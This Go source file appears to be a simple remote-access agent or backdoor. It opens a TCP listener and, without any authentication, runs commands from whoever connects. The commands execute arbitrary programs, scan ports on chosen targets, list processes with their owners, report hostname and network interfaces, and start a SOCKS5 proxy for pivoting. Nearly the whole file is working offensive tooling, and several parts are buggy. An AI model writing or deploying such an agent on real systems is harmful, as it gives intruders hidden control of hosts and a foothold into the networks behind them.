package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/akamensky/argparse"
	socks5 "github.com/armon/go-socks5"
)

type Config struct {
	PortsToScan []int
	Delay       int
	Timeout     int    `default:"3"`
	Target      string `default:"127.0.0.1"`
}

type InitConf struct {
	Host       string
	Port       int
	Connection net.Conn
}

type Process struct {
	Name string
	PID  int
	UID  int
}

func (proc Process) ToString() string {
	ret := fmt.Sprintf("%s		%d		%d\n", proc.Name, proc.PID, proc.UID)
	return ret
}
func GetProcesses() {
	processList := []Process{}
	files, err := ioutil.ReadDir("/proc")
	var re = regexp.MustCompile(`(?m)Uid:(\s\s\s\s([0-9]{4})){4}`)

	if err != nil {
		panic(err)
	}
	for _, file := range files {
		proc := Process{}
		pid, err := strconv.Atoi(file.Name())
		if err != nil {
			continue
		}
		proc.PID = pid

		name, err := ioutil.ReadFile("/proc/" + file.Name() + "/comm")
		if err != nil {
			continue
		}
		proc.Name = string(name)
		processList = append(processList, proc)

		if err != nil {
			panic(err)
		}
		status, err := ioutil.ReadFile("/proc/" + strconv.Itoa(pid) + "/status")
		if err != nil {
			continue
		}
		str := string(status)
		for _, match := range re.FindAllString(str, -1) {
			user := strings.Fields(match)
			uid, err := strconv.Atoi(user[1])
			if err != nil {
				panic(err)
			}
			proc.UID = uid

		}
	}
	conf.Connection.Write([]byte("\nNAME		PID		 UID"))
	conf.Connection.Write([]byte("\n--------------------------\n"))
	for _, process := range processList {
		conf.Connection.Write([]byte(process.ToString()))
	}

}

func GetPID(proc Process) int {
	return proc.PID
}

func GetName(proc Process) string {
	return proc.Name
}

func GetUID(proc Process) int {
	return proc.UID
}

func WriteClient(msg string) {
	conf.Connection.Write([]byte(msg))
}

func StartProxy() { //WIP
	proxyConf := &socks5.Config{}
	server, err := socks5.New(proxyConf)
	if err != nil {
		if verbose {
			WriteClient(err.Error())
		}
	}
	if err := server.ListenAndServe("tcp", "127.0.0.1:1080"); err != nil {
		if verbose {
			WriteClient(err.Error())
		}
	}
	fmt.Printf("Starting proxy. PID %d\n", os.Getpid())
	conf.Connection.Write([]byte(fmt.Sprintf("Starting proxy. PID %d\n", os.Getpid())))
}

func ScanPort(cnfg Config) error {
	var target string
	dialer := &net.Dialer{
		Timeout: time.Duration(time.Second * time.Duration(cnfg.Timeout)),
	}
	for _, port := range cnfg.PortsToScan {
		target = cnfg.Target + ":" + strconv.Itoa(port)
		conf.Connection.Write([]byte(fmt.Sprintf("[!] Scanning port %d...\n", port)))
		conn, err := dialer.Dial("tcp", target)
		if conn != nil {
			defer conn.Close()
		}
		if err != nil {
			conf.Connection.Write([]byte(fmt.Sprintf("[-] Closed port: %d\n", port)))
			if verbose {
				WriteClient(err.Error())
			}
			continue
		} else {
			conf.Connection.Write([]byte(fmt.Sprintf("[+] Found open port: %d\n", port)))
			continue
		}
	}
	return nil
}

func handleFlags(input string) Config {
	cnfg := Config{}
	r := regexp.MustCompile(`(-ports|-target|-delay|-time|--[a-zA-Z]+)\s+(\S+)`)
	matches := r.FindAllStringSubmatch(input, -1)
	for _, m := range matches {
		if strings.Contains(m[1], "-ports") {
			portarr := strings.Split(m[2], ",")
			for i, port := range portarr {
				portarr[i] = strings.TrimSpace(port)
			}
			var portarr_int []int
			for _, val := range portarr {
				cnv, err := strconv.Atoi(val)
				if verbose {
					WriteClient(err.Error())
				}
				portarr_int = append(portarr_int, cnv)
				continue
			}
			cnfg.PortsToScan = portarr_int
		}
		if strings.Contains(m[1], "-delay") {
			delay_val, err := strconv.Atoi(m[2])
			if verbose {
				WriteClient(err.Error())
			}
			cnfg.Delay = delay_val
		}
		if strings.Contains(m[1], "-target") {
			cnfg.Target = m[2]
		}
		if strings.Contains(m[1], "-time") {
			cnv, err := strconv.Atoi(m[2])
			if verbose {
				WriteClient(err.Error())
			}
			cnfg.Timeout = cnv
		}
	}

	return cnfg
}

func getNetworkInfo() {
	var info string
	hostname, err := os.Hostname()
	if err != nil {
		if verbose {
			WriteClient(err.Error())
		}
	}
	info += ("\n\tHostname: " + hostname) + "\n"

	ifaces, err := net.Interfaces()
	if err != nil {
		if verbose {
			WriteClient(err.Error())
		}
	}
	info += "\t" + "=====================\n"
	info += "\t" + "Interfaces:\n"
	for _, iface := range ifaces {
		//conf.Connection.Write([]byte(iface.Name))
		addresses, err := iface.Addrs()
		if err != nil {
			if verbose {
				WriteClient(err.Error())
			}

		}
		if len(addresses) == 0 {
			continue
		}
		info += fmt.Sprintf("\n\tName: %s\n\t--------------------\n", iface.Name)

		for _, addr := range addresses {
			if len(addr.String()) > 0 {
				info += fmt.Sprintf("\tAddress: %s | Network: %s", addr.String(), addr.Network()) + "\n"
			} else {
				continue
			}
		}
	}
	conf.Connection.Write([]byte(info))
}

func HandleConnection(conn net.Conn) {
	defer conn.Close()
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, " ")
		if len(parts) == 0 {
			continue
		}
		switch parts[0] {
		case "portscan":
			if len(parts) == 1 {
				conn.Write([]byte(fmt.Sprintln("Missing arguments")))
				conn.Write([]byte(fmt.Sprintln("	-ports=<ports>: ports to scan. for multiple ports, split using a period (,) (required)")))
				conn.Write([]byte(fmt.Sprintln("	-delay=<time>: delay between requests")))
				conn.Write([]byte(fmt.Sprintln("	-time=<time>: timeout in seconds")))
				conn.Write([]byte(fmt.Sprintln("	-target=<target>: target to scan")))
				continue
			}
			cnfg := handleFlags(line)
			err := ScanPort(cnfg)
			if err != nil {
				conn.Write([]byte(fmt.Sprintf("Error: %v\n", err)))
			}
		case "shell":
			cmd := exec.Command(parts[1])
			output, err := cmd.CombinedOutput()
			if err != nil {
				conn.Write([]byte(err.Error()))
				continue
			}
			conn.Write(output)
		case "help":
			help := `
			net: shows network information
			portscan: scans ports on a given host
			shell: executes a shell command
			version: prints the agent version
			ps: shows all active processes and their respective owners
			exit: closes the connection
			` + "\n"
			conn.Write([]byte(help))
		case "version":
			conn.Write([]byte("Agent version 0.1 by mrLochness\n"))
		case "net":
			getNetworkInfo()
		case "ps":
			GetProcesses()
		case "proxy":
			go func() {
				proxyConf := &socks5.Config{}
				server, err := socks5.New(proxyConf)
				if err != nil {
					WriteClient(err.Error())
				}
				if err := server.ListenAndServe("tcp", "127.0.0.1:1080"); err != nil {
					WriteClient(err.Error())
				}
				fmt.Printf("Starting proxy. PID %d\n", os.Getpid())
				conf.Connection.Write([]byte(fmt.Sprintf("Starting proxy. PID %d\n", os.Getpid())))
			}()
		default:
			conn.Write([]byte("Error: unknown command\n"))
		}
	}
}

var conf = InitConf{}
var verbose bool

func main() {

	parser := argparse.NewParser("listener", "does stuff")
	client := parser.String("c", "client", &argparse.Options{Required: false, Help: "client address", Default: ""})
	port := parser.Int("p", "port", &argparse.Options{Required: false, Help: "port to connect to", Default: 9001})
	verbosity := parser.Flag("v", "verbose", &argparse.Options{Required: false, Help: "adds verbosity"})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
	}
	if *verbosity {
		verbose = true
	}
	target := fmt.Sprintf(":%d", *port)
	conf.Host = *client
	conf.Port = *port

	ln, err := net.Listen("tcp", target)
	if err != nil {
		conf.Connection.Write([]byte(err.Error()))
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			conf.Connection.Write([]byte(err.Error()))
			continue
		}
		conf.Connection = conn
		fmt.Printf("connected to %s\n", conn.RemoteAddr().String())
		fmt.Println("listening.....")
		fmt.Println("------------------------")
		go HandleConnection(conn)
	}

}
